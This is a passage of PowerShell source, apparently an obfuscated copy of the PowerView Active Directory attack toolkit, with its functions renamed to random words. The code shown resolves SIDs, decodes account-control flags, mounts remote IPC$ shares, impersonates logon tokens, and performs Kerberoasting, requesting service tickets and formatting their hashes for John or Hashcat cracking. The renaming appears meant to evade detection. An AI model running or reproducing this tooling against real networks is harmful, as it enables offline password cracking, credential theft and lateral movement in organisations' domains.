        if ($PSBoundParameters['Domain']) { $Z9fLSYGKyDMNEO9['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $Z9fLSYGKyDMNEO9['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Credential']) { $Z9fLSYGKyDMNEO9['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        ForEach ($Object in $fT9WVEyXAx9DPM9) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = intermediate -MhNmgElNMTxhWpJ $Object -nnLLVWbvFttZtjp 'DN' @DomainSearcherArguments
                if ($DN) {
                    $tXyHSLSY9cxTtcf = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $p9HnEIzwegumibI = $DN.Split(',')[0].split('=')[1]

                    $Z9fLSYGKyDMNEO9['Identity'] = $p9HnEIzwegumibI
                    $Z9fLSYGKyDMNEO9['Domain'] = $tXyHSLSY9cxTtcf
                    $Z9fLSYGKyDMNEO9['Properties'] = 'objectsid'
                    ensnared @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $pkMxgDCVHqOym9m = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $Z9fLSYGKyDMNEO9 = @{}
                        $pkMxgDCVHqOym9m = (forked @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($pkMxgDCVHqOym9m, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[curlew] Error converting $pkMxgDCVHqOym9m\$Object : $_"
                }
            }
        }
    }
}


function congesting {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $BwJjYSLSjCOa9Mo,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $kjrB9uCaUhqSpoz = @{}
        if ($PSBoundParameters['Domain']) { $kjrB9uCaUhqSpoz['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $kjrB9uCaUhqSpoz['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Credential']) { $kjrB9uCaUhqSpoz['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        ForEach ($GcgzidmbGlwR9ya in $BwJjYSLSjCOa9Mo) {
            $GcgzidmbGlwR9ya = $GcgzidmbGlwR9ya.trim('*')
            try {

                Switch ($GcgzidmbGlwR9ya) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        intermediate -MhNmgElNMTxhWpJ $GcgzidmbGlwR9ya @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[congesting] Error converting SID '$GcgzidmbGlwR9ya' : $_"
            }
        }
    }
}


function intermediate {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $nnLLVWbvFttZtjp,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $aCErcIlOoMAiUCi = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }


        function Invoke-Method([__ComObject] $Object, [String] $hcDrBLy9ZyM9IkS, $aN9JU9XMJIQvisS) {
            $MCqE9JDSKKFQghW = $Null
            $MCqE9JDSKKFQghW = $Object.GetType().InvokeMember($hcDrBLy9ZyM9IkS, 'InvokeMethod', $NULL, $Object, $aN9JU9XMJIQvisS)
            Write-Output $MCqE9JDSKKFQghW
        }

        function Get-Property([__ComObject] $Object, [String] $bUTRJkx99v9ejFU) {
            $Object.GetType().InvokeMember($bUTRJkx99v9ejFU, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $bUTRJkx99v9ejFU, $aN9JU9XMJIQvisS) {
            [Void] $Object.GetType().InvokeMember($bUTRJkx99v9ejFU, 'SetProperty', $NULL, $Object, $aN9JU9XMJIQvisS)
        }


        if ($PSBoundParameters['Server']) {
            $DjvHmn9DLqnAiYs = 2
            $FwbHe9qRyvJyNME = $vzBgfX9wPWmbsYZ
        }
        elseif ($PSBoundParameters['Domain']) {
            $DjvHmn9DLqnAiYs = 1
            $FwbHe9qRyvJyNME = $pkMxgDCVHqOym9m
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $szvFVWkPJummdcf.GetNetworkCredential()
            $DjvHmn9DLqnAiYs = 1
            $FwbHe9qRyvJyNME = $Cred.Domain
        }
        else {

            $DjvHmn9DLqnAiYs = 3
            $FwbHe9qRyvJyNME = $Null
        }
    }

    PROCESS {
        ForEach ($SAjI9PErqJp9HkG in $MhNmgElNMTxhWpJ) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($SAjI9PErqJp9HkG -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $FIXd9Bz9ksMzlXM = $aCErcIlOoMAiUCi['DomainSimple']
                }
                else {
                    $FIXd9Bz9ksMzlXM = $aCErcIlOoMAiUCi['NT4']
                }
            }
            else {
                $FIXd9Bz9ksMzlXM = $aCErcIlOoMAiUCi[$nnLLVWbvFttZtjp]
            }

            $v9K9SxYwoNMSkpK = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $szvFVWkPJummdcf.GetNetworkCredential()

                    Invoke-Method $v9K9SxYwoNMSkpK 'InitEx' (
                        $DjvHmn9DLqnAiYs,
                        $FwbHe9qRyvJyNME,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[intermediate] Error initializing translation for '$MhNmgElNMTxhWpJ' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $v9K9SxYwoNMSkpK 'Init' (
                        $DjvHmn9DLqnAiYs,
                        $FwbHe9qRyvJyNME
                    )
                }
                catch {
                    Write-Verbose "[intermediate] Error initializing translation for '$MhNmgElNMTxhWpJ' : $_"
                }
            }


            Set-Property $v9K9SxYwoNMSkpK 'ChaseReferral' (0x60)

            try {

                $Null = Invoke-Method $v9K9SxYwoNMSkpK 'Set' (8, $SAjI9PErqJp9HkG)
                Invoke-Method $v9K9SxYwoNMSkpK 'Get' ($FIXd9Bz9ksMzlXM)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[intermediate] Error translating '$SAjI9PErqJp9HkG' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function struts {


    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $9yLQAo99dA9YgOe
    )

    BEGIN {

        $Lles9ZYvXrrYAer = New-Object System.Collections.Specialized.OrderedDictionary
        $Lles9ZYvXrrYAer.Add("SCRIPT", 1)
        $Lles9ZYvXrrYAer.Add("ACCOUNTDISABLE", 2)
        $Lles9ZYvXrrYAer.Add("HOMEDIR_REQUIRED", 8)
        $Lles9ZYvXrrYAer.Add("LOCKOUT", 16)
        $Lles9ZYvXrrYAer.Add("PASSWD_NOTREQD", 32)
        $Lles9ZYvXrrYAer.Add("PASSWD_CANT_CHANGE", 64)
        $Lles9ZYvXrrYAer.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $Lles9ZYvXrrYAer.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $Lles9ZYvXrrYAer.Add("NORMAL_ACCOUNT", 512)
        $Lles9ZYvXrrYAer.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $Lles9ZYvXrrYAer.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $Lles9ZYvXrrYAer.Add("SERVER_TRUST_ACCOUNT", 8192)
        $Lles9ZYvXrrYAer.Add("DONT_EXPIRE_PASSWORD", 65536)
        $Lles9ZYvXrrYAer.Add("MNS_LOGON_ACCOUNT", 131072)
        $Lles9ZYvXrrYAer.Add("SMARTCARD_REQUIRED", 262144)
        $Lles9ZYvXrrYAer.Add("TRUSTED_FOR_DELEGATION", 524288)
        $Lles9ZYvXrrYAer.Add("NOT_DELEGATED", 1048576)
        $Lles9ZYvXrrYAer.Add("USE_DES_KEY_ONLY", 2097152)
        $Lles9ZYvXrrYAer.Add("DONT_REQ_PREAUTH", 4194304)
        $Lles9ZYvXrrYAer.Add("PASSWORD_EXPIRED", 8388608)
        $Lles9ZYvXrrYAer.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $Lles9ZYvXrrYAer.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $JjRJfoHfivURgnW = New-Object System.Collections.Specialized.OrderedDictionary

        if ($9yLQAo99dA9YgOe) {
            ForEach ($CEKifFqxfnVApbV in $Lles9ZYvXrrYAer.GetEnumerator()) {
                if ( ($Value -band $CEKifFqxfnVApbV.Value) -eq $CEKifFqxfnVApbV.Value) {
                    $JjRJfoHfivURgnW.Add($CEKifFqxfnVApbV.Name, "$($CEKifFqxfnVApbV.Value)+")
                }
                else {
                    $JjRJfoHfivURgnW.Add($CEKifFqxfnVApbV.Name, "$($CEKifFqxfnVApbV.Value)")
                }
            }
        }
        else {
            ForEach ($CEKifFqxfnVApbV in $Lles9ZYvXrrYAer.GetEnumerator()) {
                if ( ($Value -band $CEKifFqxfnVApbV.Value) -eq $CEKifFqxfnVApbV.Value) {
                    $JjRJfoHfivURgnW.Add($CEKifFqxfnVApbV.Name, "$($CEKifFqxfnVApbV.Value)")
                }
            }
        }
        $JjRJfoHfivURgnW
    }
}


function Gautama {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($MhNmgElNMTxhWpJ -match '.+\\.+')) {
            if ($MhNmgElNMTxhWpJ -match '.+\\.+') {

                $enclY9kMZgMnLZA = $MhNmgElNMTxhWpJ | intermediate -nnLLVWbvFttZtjp Canonical
                if ($enclY9kMZgMnLZA) {
                    $mDGsHdL9dgaDAVe = $enclY9kMZgMnLZA.SubString(0, $enclY9kMZgMnLZA.IndexOf('/'))
                    $zWtQw9mpOLSRYnt = $MhNmgElNMTxhWpJ.Split('\')[1]
                    Write-Verbose "[Gautama] Binding to domain '$mDGsHdL9dgaDAVe'"
                }
            }
            else {
                $zWtQw9mpOLSRYnt = $MhNmgElNMTxhWpJ
                Write-Verbose "[Gautama] Binding to domain '$pkMxgDCVHqOym9m'"
                $mDGsHdL9dgaDAVe = $pkMxgDCVHqOym9m
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Gautama] Using alternate credentials'
                $LpgwDvCRKxnE9zi = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $mDGsHdL9dgaDAVe, $szvFVWkPJummdcf.UserName, $szvFVWkPJummdcf.GetNetworkCredential().Password)
            }
            else {
                $LpgwDvCRKxnE9zi = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $mDGsHdL9dgaDAVe)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Gautama] Using alternate credentials'
                $JaqQNdCUbH99GJm = forked | Select-Object -ExpandProperty Name
                $LpgwDvCRKxnE9zi = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $JaqQNdCUbH99GJm, $szvFVWkPJummdcf.UserName, $szvFVWkPJummdcf.GetNetworkCredential().Password)
            }
            else {
                $LpgwDvCRKxnE9zi = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $zWtQw9mpOLSRYnt = $MhNmgElNMTxhWpJ
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $LpgwDvCRKxnE9zi
        $Out | Add-Member Noteproperty 'Identity' $zWtQw9mpOLSRYnt
        $Out
    }
    catch {
        Write-Warning "[Gautama] Error creating binding for object ('$MhNmgElNMTxhWpJ') context : $_"
    }
}


function misquote {


    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf
    )

    BEGIN {
        $SkmHrMHwPJcjgMS = [Activator]::CreateInstance($npJBaIWRNRrVEFS)
        $SkmHrMHwPJcjgMS.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($ZThBVMgda9VhrfH in $cNTDaoDBIWkDu9I) {
                $ZThBVMgda9VhrfH = $ZThBVMgda9VhrfH.Trim('\')
                $Paths += ,"\\$ZThBVMgda9VhrfH\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($uszMwnNhSpfzkA9 in $Paths) {
            $SkmHrMHwPJcjgMS.lpRemoteName = $uszMwnNhSpfzkA9
            Write-Verbose "[misquote] Attempting to mount: $uszMwnNhSpfzkA9"



            $tP9ZFuQ9oFJi9ZB = $Mpr::WNetAddConnection2W($SkmHrMHwPJcjgMS, $szvFVWkPJummdcf.GetNetworkCredential().Password, $szvFVWkPJummdcf.UserName, 4)

            if ($tP9ZFuQ9oFJi9ZB -eq 0) {
                Write-Verbose "$uszMwnNhSpfzkA9 successfully mounted"
            }
            else {
                Throw "[misquote] error mounting $uszMwnNhSpfzkA9 : $(([ComponentModel.Win32Exception]$tP9ZFuQ9oFJi9ZB).Message)"
            }
        }
    }
}


function densities {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($ZThBVMgda9VhrfH in $cNTDaoDBIWkDu9I) {
                $ZThBVMgda9VhrfH = $ZThBVMgda9VhrfH.Trim('\')
                $Paths += ,"\\$ZThBVMgda9VhrfH\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($uszMwnNhSpfzkA9 in $Paths) {
            Write-Verbose "[densities] Attempting to unmount: $uszMwnNhSpfzkA9"
            $tP9ZFuQ9oFJi9ZB = $Mpr::WNetCancelConnection2($uszMwnNhSpfzkA9, 0, $True)

            if ($tP9ZFuQ9oFJi9ZB -eq 0) {
                Write-Verbose "$uszMwnNhSpfzkA9 successfully ummounted"
            }
            else {
                Throw "[densities] error unmounting $uszMwnNhSpfzkA9 : $(([ComponentModel.Win32Exception]$tP9ZFuQ9oFJi9ZB).Message)"
            }
        }
    }
}


function descendents {


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $waC9KrLWsegTDKV,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[descendents] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $TfO9pHbyVVUXnrg = $waC9KrLWsegTDKV
    }
    else {
        $TfO9pHbyVVUXnrg = [IntPtr]::Zero
        $nTNkZxoYxnhhvuG = $szvFVWkPJummdcf.GetNetworkCredential()
        $tXyHSLSY9cxTtcf = $nTNkZxoYxnhhvuG.Domain
        $p9HnEIzwegumibI = $nTNkZxoYxnhhvuG.UserName
        Write-Warning "[descendents] Executing LogonUser() with user: $($tXyHSLSY9cxTtcf)\$($p9HnEIzwegumibI)"



        $tP9ZFuQ9oFJi9ZB = $JRe9dkTvhkNHAuS::LogonUser($p9HnEIzwegumibI, $tXyHSLSY9cxTtcf, $nTNkZxoYxnhhvuG.Password, 9, 3, [ref]$TfO9pHbyVVUXnrg);$aMxKZmpCKWbTpbk = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $tP9ZFuQ9oFJi9ZB) {
            throw "[descendents] LogonUser() Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
        }
    }


    $tP9ZFuQ9oFJi9ZB = $JRe9dkTvhkNHAuS::ImpersonateLoggedOnUser($TfO9pHbyVVUXnrg)

    if (-not $tP9ZFuQ9oFJi9ZB) {
        throw "[descendents] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
    }

    Write-Verbose "[descendents] Alternate credentials successfully impersonated"
    $TfO9pHbyVVUXnrg
}


function volubility {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $waC9KrLWsegTDKV
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[volubility] Reverting token impersonation and closing LogonUser() token handle"
        $tP9ZFuQ9oFJi9ZB = $Kernel32::CloseHandle($waC9KrLWsegTDKV)
    }

    $tP9ZFuQ9oFJi9ZB = $JRe9dkTvhkNHAuS::RevertToSelf();$aMxKZmpCKWbTpbk = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $tP9ZFuQ9oFJi9ZB) {
        throw "[volubility] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
    }

    Write-Verbose "[volubility] Token impersonation successfully reverted"
}


function embryologist {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $TwWb9jav9DsNots = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $DtaxsoUYgs9jTDU = $User
        }
        else {
            $DtaxsoUYgs9jTDU = $SPN
        }

        ForEach ($Object in $DtaxsoUYgs9jTDU) {
            if ($PSBoundParameters['User']) {
                $nQLmjrtDGzQGBvr = $Object.ServicePrincipalName
                $JbtS9UlqTiGk9qR = $Object.SamAccountName
                $XsrXGCx9OagiGnf = $Object.DistinguishedName
            }
            else {
                $nQLmjrtDGzQGBvr = $Object
                $JbtS9UlqTiGk9qR = 'UNKNOWN'
                $XsrXGCx9OagiGnf = 'UNKNOWN'
            }


            if ($nQLmjrtDGzQGBvr -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $nQLmjrtDGzQGBvr = $nQLmjrtDGzQGBvr[0]
            }

            try {
                $UCTVQQVzu9R9zoY = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $nQLmjrtDGzQGBvr
            }
            catch {
                Write-Warning "[embryologist] Error requesting ticket for SPN '$nQLmjrtDGzQGBvr' from user '$XsrXGCx9OagiGnf' : $_"
            }
            if ($UCTVQQVzu9R9zoY) {
                $hsvgaCCGxzGTnUS = $UCTVQQVzu9R9zoY.GetRequest()
            }
            if ($hsvgaCCGxzGTnUS) {
                $Out = New-Object PSObject

                $imQjRxVjtQTKqbZ = [System.BitConverter]::ToString($hsvgaCCGxzGTnUS) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $JbtS9UlqTiGk9qR
                $Out | Add-Member Noteproperty 'DistinguishedName' $XsrXGCx9OagiGnf
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $UCTVQQVzu9R9zoY.ServicePrincipalName



                if($imQjRxVjtQTKqbZ -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $LPsXhYTSwJgTmhS = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $oAeYLAbeYbFq9nu = $Matches.DataToEnd.Substring(0,$LPsXhYTSwJgTmhS*2)


                    if($Matches.DataToEnd.Substring($LPsXhYTSwJgTmhS*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($UCTVQQVzu9R9zoY.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($hsvgaCCGxzGTnUS).Replace('-',''))
                    } else {
                        $Hash = "$($oAeYLAbeYbFq9nu.Substring(0,32))`$$($oAeYLAbeYbFq9nu.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($UCTVQQVzu9R9zoY.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($hsvgaCCGxzGTnUS).Replace('-',''))
                }

                if($Hash) {

                    if ($TwWb9jav9DsNots -match 'John') {
                        $KtzoY9boKbMYQ9V = "`$onHHQBcqWOlKXYT`$$($UCTVQQVzu9R9zoY.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($XsrXGCx9OagiGnf -ne 'UNKNOWN') {
                            $tXyHSLSY9cxTtcf = $XsrXGCx9OagiGnf.SubString($XsrXGCx9OagiGnf.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $tXyHSLSY9cxTtcf = 'UNKNOWN'
                        }


                        $KtzoY9boKbMYQ9V = "`$onHHQBcqWOlKXYT`$$($Etype)`$*$JbtS9UlqTiGk9qR`$$tXyHSLSY9cxTtcf`$$($UCTVQQVzu9R9zoY.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $KtzoY9boKbMYQ9V
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function manipulates {


